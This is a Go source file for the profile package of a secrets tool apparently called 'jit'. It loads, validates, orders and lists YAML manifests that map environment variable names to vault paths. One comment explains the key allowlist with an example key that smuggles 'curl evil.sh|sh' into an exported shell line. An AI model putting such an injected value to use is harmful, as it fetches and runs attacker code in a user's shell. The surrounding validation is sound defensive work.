// Copyright 2026 Meni Tasa
// SPDX-License-Identifier: LicenseRef-PolyForm-Perimeter-1.0.0

package profile

import (
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strings"

	"gopkg.in/yaml.v3"
)

// ErrNotFound reports that a profile name resolved to no manifest in any
// scope — as opposed to a manifest that exists and won't parse. The two are
// entirely different problems (a typo'd name versus broken YAML) with
// entirely different fixes, and a caller that renders them the same way
// sends the reader after the wrong one. `jit doctor` classifies its findings
// on this: errors.Is(err, ErrNotFound) is [not found], anything else from a
// load is [parse].
//
// The wording is the tail of the sentence LoadWithScope already produced
// ("profile %q not found (checked …)"), so wrapping it there left every
// existing message byte-for-byte unchanged.
var ErrNotFound = errors.New("not found")

// ProfilesDir is where profile manifests live, relative to a project root
// (RFC.md Pillar IV's own example: ".jit/profiles/aws-admin.yaml") — a
// project-scoped location, deliberately separate from the vault's
// home-directory-rooted storage, since a profile is safe to commit to git
// (it holds only paths, never ciphertext or values).
const ProfilesDir = ".jit/profiles"

// namePattern mirrors internal/vault's own path-safety discipline: a
// profile name becomes part of a real filesystem path below, so the same
// defense-in-depth (allowlist first, verify the joined path can't escape
// second) applies here too.
var namePattern = regexp.MustCompile(`^[A-Za-z0-9_.\-]+$`)

// varNamePattern is what a manifest's KEYS must look like: the POSIX shell
// name rule, and the same shape internal/migrate's own envLinePattern already
// enforces on every name it writes.
//
// This is a security boundary, not tidiness. `jit export` renders each entry
// as `export <name>=<quoted value>` for the user to `eval`, and while the
// VALUE side is single-quote escaped for arbitrary bytes, the name is
// interpolated verbatim — so a key like `X; curl evil.sh|sh #` becomes a
// command in a line the user is about to run in their own shell. Manifests are
// designed to be committed and shared (see ProfilesDir), which makes a hostile
// one an ordinary pull-request-shaped delivery of exactly the
// malicious-repo-content attack RFC §1 names as jit's reason to exist.
//
// Rejected, never sanitized: a mangled name would silently fill the wrong
// variable, and there is no legitimate reading of a key the shell cannot
// export anyway. It also settles a second bug for free — a name containing
// `=` made inject.MergeEnv emit `FOO=BAR=<secret>`, quietly shadowing FOO.
var varNamePattern = regexp.MustCompile(`^[A-Za-z_][A-Za-z0-9_]*$`)

// ValidVarName reports whether name is a legal manifest key, by the rule
// above. Exported so a command that WRITES a manifest applies the same rule
// LoadFile applies when reading one, instead of writing a file that only
// fails at first use.
func ValidVarName(name string) bool { return varNamePattern.MatchString(name) }

// Profile maps an environment variable name to the vault secret path that
// should fill it (RFC.md Pillar IV) — a named *view* over the vault tree,
// not a copy of it.
type Profile map[string]string

// Scope identifies which store a profile manifest was found in — the
// project-relative .jit/profiles/ a caller's root points at, or the
// home-rooted GlobalRoot() fallback. Surfaced to jit status --secrets and
// jit doctor so a name that exists in both isn't ambiguous to read about,
// even though Load's own resolution always prefers project.
type Scope string

const (
	ScopeProject Scope = "project"
	ScopeGlobal  Scope = "global"
)

// Info describes one discovered profile manifest — its name, which store
// it was found in, and its file path — without loading and parsing its
// contents. For listing many profiles at once (as `jit status --secrets`
// and the --profile completions do) where per-entry contents aren't needed
// yet.
type Info struct {
	Name  string
	Scope Scope
	Path  string
}

// Path returns the manifest file path for name under root (a project
// directory, typically the current working directory).
func Path(root, name string) (string, error) {
	if !namePattern.MatchString(name) {
		return "", fmt.Errorf("profile name %q must contain only letters, digits, '.', '_', '-'", name)
	}
	return filepath.Join(root, ProfilesDir, name+".yaml"), nil
}

// GlobalRoot returns the root used for profiles that aren't tied to one
// project directory — shell-config and MCP-config migrations (GAPS.md #7)
// store their profile here instead of under a project's .jit/profiles/,
// since the command that resolves them (a new shell, an MCP host's own
// subprocess) can't be relied on to start from any particular working
// directory. Load falls back to this root when a profile isn't found
// relative to its own root argument, so this is the one place that
// decision lives.
func GlobalRoot() (string, error) {
	return os.UserHomeDir()
}

// Load reads and parses the profile manifest named name under root, falling
// back to the home-rooted global store (GlobalRoot) if it isn't found there
// — see GlobalRoot's doc comment for why that fallback exists.
func Load(root, name string) (Profile, error) {
	p, _, _, err := LoadWithScope(root, name)
	return p, err
}

// LoadWithScope behaves like Load but also reports which store the profile
// was actually resolved from (its Scope) and the manifest's real file path
// — for callers like jit doctor that report where a profile lives, not
// just its contents.
//
// A root that IS the home directory resolves as ScopeGlobal: <home>/.jit/profiles
// is the global store, whichever way the caller reached it (see rootIsGlobal).
func LoadWithScope(root, name string) (Profile, Scope, string, error) {
	home, herr := GlobalRoot()
	atHome := herr == nil && rootIsGlobal(root, home)
	scope := ScopeProject
	if atHome {
		// The home-rooted path, not root's spelling of it, so a caller that
		// compares manifest paths (the mount registry records them) sees the
		// same string it would from any other directory.
		root, scope = home, ScopeGlobal
	}
	path, err := Path(root, name)
	if err != nil {
		return nil, "", "", err
	}
	p, err := LoadFile(path)
	if err == nil {
		return p, scope, path, nil
	}
	if !errors.Is(err, os.ErrNotExist) {
		return nil, "", "", err
	}

	tried := []string{path}
	if herr == nil && !atHome {
		if globalPath, perr := Path(home, name); perr == nil {
			gp, gerr := LoadFile(globalPath)
			if gerr == nil {
				return gp, ScopeGlobal, globalPath, nil
			}
			// Surface a real failure instead of folding it into ErrNotFound —
			// the same rule the project branch above applies, and the whole
			// point of the sentinel per ErrNotFound's doc: a typo'd name and
			// broken YAML are different problems with different fixes. This
			// branch used to discard gerr, so a malformed or unparseable
			// ~/.jit/profiles/<name>.yaml reported `profile "x" not found
			// (checked …)` and sent the user hunting for a file sitting right
			// there, named in the message.
			if !errors.Is(gerr, os.ErrNotExist) {
				return nil, "", "", gerr
			}
			tried = append(tried, globalPath)
		}
	}
	// Phrased so the sentinel supplies the words it already read as: the
	// rendered message stays byte-identical to the one every `--profile`
	// consumer has always printed, and only its machine-readable identity
	// changes.
	return nil, "", "", fmt.Errorf("profile %q %w (checked %s)", name, ErrNotFound, strings.Join(tried, ", "))
}

// LoadFile reads and parses a profile manifest at an absolute path
// directly, bypassing the root+name convention Load/Path use — for
// consumers (jit agent, via the mount registry) that already have a
// specific manifest's real path rather than a project root to resolve a
// name against.
func LoadFile(path string) (Profile, error) {
	p, _, err := LoadFileOrdered(path)
	return p, err
}

// LoadFileOrdered is LoadFile plus the manifest's own key order. A YAML
// map decodes into a Go map, which forgets the order the file wrote its
// keys in — but the file itself never does, and since migrate writes
// manifests in the source file's variable order (issue #4), that order is
// what lets a mount serve variables the way the original .env listed them
// instead of alphabetically. Manifests written by older jit builds are
// simply alphabetical on disk, so their order degrades to the old sorted
// rendering.
func LoadFileOrdered(path string) (Profile, []string, error) {
	data, err := os.ReadFile(path) // #nosec G304 -- path is either built from a validated name under a fixed project-relative directory (Load), or read from jit's own mount registry (LoadFile's other caller), never raw external input
	if err != nil {
		return nil, nil, fmt.Errorf("reading profile %s: %w", path, err)
	}

	var p Profile
	if err := yaml.Unmarshal(data, &p); err != nil {
		return nil, nil, fmt.Errorf("parsing profile %s: %w", path, err)
	}
	if len(p) == 0 {
		return nil, nil, fmt.Errorf("profile %s has no entries", path)
	}
	for varName, secretPath := range p {
		if strings.TrimSpace(varName) == "" {
			return nil, nil, fmt.Errorf("profile %s: has an entry with an empty variable name", path)
		}
		if !varNamePattern.MatchString(varName) {
			// %q, so a name carrying control characters or an embedded newline
			// can't dress the error up as extra output of its own.
			return nil, nil, fmt.Errorf("profile %s: %q is not a usable environment variable name "+
				"(letters, digits and underscore, not starting with a digit). jit export renders each entry "+
				"into shell for you to eval, so a name outside that set is refused rather than passed through", path, varName)
		}
		if strings.TrimSpace(secretPath) == "" {
			return nil, nil, fmt.Errorf("profile %s: %s has no secret path", path, varName)
		}
	}

	var doc yaml.Node
	if err := yaml.Unmarshal(data, &doc); err != nil || len(doc.Content) == 0 || doc.Content[0].Kind != yaml.MappingNode {
		return p, nil, nil // order is best-effort; the validated map is what matters
	}
	mapping := doc.Content[0]
	order := make([]string, 0, len(p))
	for i := 0; i+1 < len(mapping.Content); i += 2 {
		order = append(order, mapping.Content[i].Value)
	}
	return p, order, nil
}

// manifestHeader is the comment every manifest jit writes carries. It says
// the one thing someone deciding whether to commit the file needs to know,
// and it exists because the pointer files jit used to write beside these said
// it from the day they shipped while the manifests said nothing — so the .pointers
// companions got committed and the profiles they name did not, which is how
// a restored vault arrives on a new machine with every secret present and
// no profile left to reference them.
//
// Deliberately NOT pointerfile.Header: that marker is how audit and migrate
// recognise a rewritten .env, and a manifest answering to it would be parsed
// as one.
//
// yaml.v3 writes each line with its own "# " prefix, so none is typed here.
const manifestHeader = "jit profile — no secret values here, only vault paths.\n" +
	"Real values reach a tool through `jit run --profile <name>`, never from\n" +
	"this file. Safe to commit: without it the vault's secrets cannot be\n" +
	"resolved on another machine."

// MarshalOrdered renders p as YAML with its keys in order — names p
// contains from order first, then any p has that order doesn't, sorted.
// yaml.Marshal on a map always alphabetizes; this is how migrate persists
// a source file's own variable order into the manifest (issue #4), which
// LoadFileOrdered later reads back.
func MarshalOrdered(p Profile, order []string) ([]byte, error) {
	names := make([]string, 0, len(p))
	seen := make(map[string]bool, len(p))
	for _, name := range order {
		if _, ok := p[name]; ok && !seen[name] {
			seen[name] = true
			names = append(names, name)
		}
	}
	rest := make([]string, 0, len(p)-len(names))
	for name := range p {
		if !seen[name] {
			rest = append(rest, name)
		}
	}
	sort.Strings(rest)
	names = append(names, rest...)

	node := &yaml.Node{Kind: yaml.MappingNode, HeadComment: manifestHeader}
	for _, name := range names {
		node.Content = append(node.Content,
			&yaml.Node{Kind: yaml.ScalarNode, Value: name},
			&yaml.Node{Kind: yaml.ScalarNode, Value: p[name]})
	}
	return yaml.Marshal(node)
}

// Overlay merges layers in ascending precedence order — a later layer's
// vault path wins for any variable name it shares with an earlier one —
// into a single effective Profile. This is how `jit run`/`jit export`
// realize dotenv layering (.env overridden by .env.local, etc.): each
// .env-family file keeps its own independent profile and vault namespace
// (see internal/migrate's deriveProfileName for why that separation is
// load-bearing), and the merge happens here, at resolution time, never in
// storage. Nil layers are skipped; the result is always a fresh map.
func Overlay(layers ...Profile) Profile {
	merged := Profile{}
	for _, layer := range layers {
		for varName, secretPath := range layer {
			merged[varName] = secretPath
		}
	}
	return merged
}

// ListNames returns every profile name found under root's ProfilesDir,
// sorted. Returns an empty slice, not an error, if the directory doesn't
// exist — a project simply not using profiles yet is a valid state.
func ListNames(root string) ([]string, error) {
	dir := filepath.Join(root, ProfilesDir)
	entries, err := os.ReadDir(dir)
	if err != nil {
		if os.IsNotExist(err) {
			return nil, nil
		}
		return nil, fmt.Errorf("reading %s: %w", dir, err)
	}

	var names []string
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		if ext := filepath.Ext(e.Name()); ext == ".yaml" || ext == ".yml" {
			names = append(names, strings.TrimSuffix(e.Name(), ext))
		}
	}
	sort.Strings(names)
	return names, nil
}

// ListAll returns every profile manifest visible from root: project-local
// ones under root's ProfilesDir first, then home-rooted global ones
// (GlobalRoot) — mirroring Load's own project-before-global preference.
//
// If root and GlobalRoot() are the same directory (root already is the home
// directory), there is no project store at all: <home>/.jit/profiles IS the
// global one, so it is listed once, as ScopeGlobal. It used to be labelled
// "project" from ~, which made `jit doctor` print "(project)" on global
// profiles and `jit status` count every one of them as wired here.
func ListAll(root string) ([]Info, error) {
	var infos []Info

	home, herr := GlobalRoot()
	if herr != nil || !rootIsGlobal(root, home) {
		projectNames, err := ListNames(root)
		if err != nil {
			return nil, err
		}
		for _, name := range projectNames {
			path, err := Path(root, name)
			if err != nil {
				return nil, err
			}
			infos = append(infos, Info{Name: name, Scope: ScopeProject, Path: path})
		}
	}
	if herr != nil {
		return infos, nil
	}
	globalNames, err := ListNames(home)
	if err != nil {
		return nil, err
	}
	for _, name := range globalNames {
		path, err := Path(home, name)
		if err != nil {
			return nil, err
		}
		infos = append(infos, Info{Name: name, Scope: ScopeGlobal, Path: path})
	}
	return infos, nil
}

// rootIsGlobal reports whether root names the same directory as home, the
// global store's root. A plain string compare is not enough: a cwd reached
// through a symlink (macOS's /var and /tmp are links into /private) or
// spelled with a trailing slash is still the home directory, and treating it
// as a project would list the global store twice, once under each label.
func rootIsGlobal(root, home string) bool {
	if root == "" || home == "" {
		return false
	}
	if filepath.Clean(root) == filepath.Clean(home) {
		return true
	}
	r, rerr := filepath.EvalSymlinks(root)
	h, herr := filepath.EvalSymlinks(home)
	return rerr == nil && herr == nil && r == h
}
